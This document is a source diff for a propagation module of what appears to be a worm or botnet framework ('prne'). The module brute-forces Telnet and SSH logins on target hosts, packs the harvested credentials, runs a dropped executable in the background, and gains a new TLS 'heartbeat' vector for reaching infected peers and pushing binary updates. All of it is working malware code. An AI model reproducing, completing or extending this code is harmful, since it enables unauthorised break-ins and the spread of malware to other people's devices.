@@ -7,6 +7,7 @@
 #include "libssh2.h"
 #include "iobuf.h"
 #include "endian.h"
+#include "mbedtls.h"
 
 #include <string.h>
 #include <ctype.h>
@@ -333,16 +334,39 @@ END:
 }
 
 static bool bne_do_connect (
-	const int af,
-	const struct sockaddr *sa,
-	const socklen_t sl,
 	int *fd,
+	const prne_net_endpoint_t *ep,
 	pth_event_t ev)
 {
+	uint8_t m_sa[prne_op_max(
+		sizeof(struct sockaddr_in),
+		sizeof(struct sockaddr_in6))];
+	struct sockaddr_in *sa4;
+	struct sockaddr_in6 *sa6;
+	socklen_t sl;
 	int f_ret;
 	struct pollfd pfd;
 
-	*fd = socket(af, SOCK_STREAM, 0);
+	switch (ep->addr.ver) {
+	case PRNE_IPV_4:
+		sl = sizeof(struct sockaddr_in);
+		sa4 = (struct sockaddr_in*)m_sa;
+		prne_memzero(m_sa, sl);
+		prne_net_ep_tosin4(ep, sa4);
+		*fd = socket(sa4->sin_family, SOCK_STREAM, 0);
+		break;
+	case PRNE_IPV_6:
+		sl = sizeof(struct sockaddr_in6);
+		sa6 = (struct sockaddr_in6*)m_sa;
+		prne_memzero(m_sa, sl);
+		prne_net_ep_tosin6(ep, sa6);
+		*fd = socket(sa6->sin6_family, SOCK_STREAM, 0);
+		break;
+	default:
+		errno = EINVAL;
+		return false;
+	}
+
 	if (*fd < 0) {
 		return false;
 	}
@@ -350,7 +374,7 @@ static bool bne_do_connect (
 		return false;
 	}
 
-	f_ret = connect(*fd, sa, sl);
+	f_ret = connect(*fd, (struct sockaddr*)m_sa, sl);
 	if (f_ret < 0 && errno != EINPROGRESS) {
 		goto ERR;
 	}
@@ -1522,9 +1546,6 @@ END:
 #undef BPC
 }
 
-/*
-* - Run executable: "./$exec" & disown
-*/
 static bool bne_sh_run_exec (
 	prne_bne_t *ctx,
 	bne_sh_ctx_t *s_ctx,
@@ -1556,11 +1577,10 @@ static bool bne_sh_run_exec (
 
 static void bne_build_host_cred (
 	bne_sh_ctx_t *s_ctx,
-	const char *id,
-	const char *pw)
+	char *id,
+	char *pw)
 {
 	prne_host_cred_t hc;
-	prne_htbt_ser_rc_t src;
 	size_t m_len, enc_len;
 	uint8_t *m = NULL;
 	char *enc = NULL;
@@ -1579,7 +1599,7 @@ static void bne_build_host_cred (
 	if (enc == NULL) {
 		goto END;
 	}
-	mbedtls_base64_encode(enc, enc_len, &enc_len, m, m_len);
+	mbedtls_base64_encode((unsigned char*)enc, enc_len, &enc_len, m, m_len);
 
 	prne_free(s_ctx->host_cred);
 	s_ctx->host_cred = enc;
@@ -1671,6 +1691,59 @@ END: // CATCH
 }
 
 /*******************************************************************************
+                               HTBT Vector Impl
+*******************************************************************************/
+static bool bne_do_vec_htbt (prne_bne_t *ctx) {
+	bool ret = false;
+	prne_net_endpoint_t ep;
+	pth_event_t ev = NULL;
+	int fd = -1;
+	mbedtls_ssl_context ssl;
+
+	mbedtls_ssl_init(&ssl);
+	ep.addr = ctx->param.subject;
+	ep.port = PRNE_HTBT_PROTO_PORT;
+
+// TRY
+	if (mbedtls_ssl_setup(&ssl, ctx->param.htbt_ssl_conf) != 0) {
+		goto END;
+	}
+	mbedtls_ssl_set_bio(
+		&ssl,
+		&fd,
+		prne_mbedtls_ssl_send_cb,
+		prne_mbedtls_ssl_recv_cb,
+		NULL);
+
+	prne_pth_reset_timer(&ev, &BNE_CONN_OP_TIMEOUT);
+	if (!bne_do_connect(&fd, &ep, ev) || fd < 0) {
+		goto END;
+	}
+
+	prne_pth_reset_timer(&ev, &BNE_CONN_OP_TIMEOUT);
+	if (!prne_mbedtls_pth_handle(&ssl, mbedtls_ssl_handshake, fd, ev)) {
+		goto END;
+	}
+
+	ret =
+		prne_nstreq(
+			mbedtls_ssl_get_alpn_protocol(&ssl),
+			PRNE_HTBT_TLS_ALP);
+	if (ret) {
+/* here goes ...
+*
+* - Check the program version and update if necessary via PRNE_HTBT_OP_NY_BIN
+*/
+	}
+
+END: // CATCH
+	mbedtls_ssl_free(&ssl);
+	prne_close(fd);
+
+	return ret;
+}
+
+/*******************************************************************************
                               Telnet Vector Impl
 *******************************************************************************/
 static bool bne_do_vec_telnet (prne_bne_t *ctx) {
@@ -1711,53 +1784,29 @@ static void bne_vssh_drop_conn (bne_vssh_ctx_t *vs) {
 
 static bool bne_vssh_est_sshconn (prne_bne_t *ctx, bne_vssh_ctx_t *vs) {
 	bool ret = false;
-	uint8_t m_sa[prne_op_max(
-		sizeof(struct sockaddr_in),
-		sizeof(struct sockaddr_in6))];
-	struct sockaddr_in *sa4;
-	struct sockaddr_in6 *sa6;
-	socklen_t sl;
-	int af, f_ret;
+	int f_ret;
 	pth_event_t ev = NULL;
 	const struct timespec *pause = NULL;
+	prne_net_endpoint_t ep;
 
 	if (vs->ss != NULL) {
 		return true;
 	}
 
+	ep.addr = ctx->param.subject;
+
 	prne_pth_reset_timer(&ev, &BNE_CONN_OP_TIMEOUT);
 	while (vs->ports.size > 0 && pth_event_status(ev) != PTH_STATUS_OCCURRED) {
 		bne_port_t *p = (bne_port_t*)vs->ports.head->element;
+
+		ep.port = p->port;
 
 		if (pause != NULL) {
 			pth_nanosleep(pause, NULL);
 			pause = NULL;
 		}
-
 		bne_vssh_drop_conn(vs);
 		p->attempt += 1;
-
-		switch (ctx->param.subject.ver) {
-		case PRNE_IPV_4:
-			sl = sizeof(struct sockaddr_in);
-			sa4 = (struct sockaddr_in*)m_sa;
-			prne_memzero(m_sa, sl);
-
-			sa4->sin_family = af = AF_INET;
-			memcpy(&sa4->sin_addr, ctx->param.subject.addr, 4);
-			sa4->sin_port = htons(p->port);
-			break;
-		case PRNE_IPV_6:
-			sl = sizeof(struct sockaddr_in6);
-			sa6 = (struct sockaddr_in6*)m_sa;
-			prne_memzero(m_sa, sl);
-
-			sa6->sin6_family = af = AF_INET6;
-			memcpy(&sa6->sin6_addr, ctx->param.subject.addr, 16);
-			sa6->sin6_port = htons(p->port);
-			break;
-		default: continue;
-		}
 
 		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 1) {
 			prne_dbgpf(
@@ -1766,7 +1815,7 @@ static bool bne_vssh_est_sshconn (prne_bne_t *ctx, bne_vssh_ctx_t *vs) {
 				p->port);
 		}
 
-		if (!bne_do_connect(af, (struct sockaddr*)m_sa, sl, &vs->fd, ev)) {
+		if (!bne_do_connect(&vs->fd, &ep, ev)) {
 			ctx->result.err = errno;
 			goto END;
 		}
@@ -2141,7 +2190,6 @@ static bool bne_vssh_do_shell (prne_bne_t *ctx, bne_vssh_ctx_t *vs) {
 	sh_ctx.write_f = bne_vssh_write_f;
 	sh_ctx.flush_f = bne_vssh_flush_f;
 	sh_ctx.nl = "\n";
-	sh_ctx.host_cred;
 
 	// TODO: try exec cat command on a separate channel, write() binary directly
 	ret = bne_do_shell(ctx, &sh_ctx);
@@ -2255,6 +2303,9 @@ static void *bne_entry_f (void *p) {
 
 	for (size_t i = 0; i < ctx->param.vector.cnt; i += 1) {
 		switch (ctx->param.vector.arr[i]) {
+		case PRNE_BNE_V_HTBT:
+			f_ret = bne_do_vec_htbt(ctx);
+			break;
 		case PRNE_BNE_V_BRUTE_TELNET:
 			f_ret = bne_do_vec_telnet(ctx);
 			break;
@@ -2281,6 +2332,7 @@ void prne_free_bne_param (prne_bne_param_t *p) {}
 
 const char *prne_bne_vector_tostr (const prne_bne_vector_t v) {
 	switch (v) {
+	case PRNE_BNE_V_HTBT: return "htbt";
 	case PRNE_BNE_V_BRUTE_TELNET: return "telnet";
 	case PRNE_BNE_V_BRUTE_SSH: return "ssh";
 	}
@@ -2298,6 +2350,17 @@ prne_bne_t *prne_alloc_bne (
 	if (ctr_drbg == NULL || param->cb.exec_name == NULL) {
 		errno = EINVAL;
 		return NULL;
+	}
+
+	for (size_t i = 0; i < param->vector.cnt; i += 1) {
+		switch (param->vector.arr[i]) {
+		case PRNE_BNE_V_HTBT:
+			if (param->htbt_ssl_conf == NULL) {
+				errno = EINVAL;
+				return NULL;
+			}
+			break;
+		}
 	}
 
 // TRY
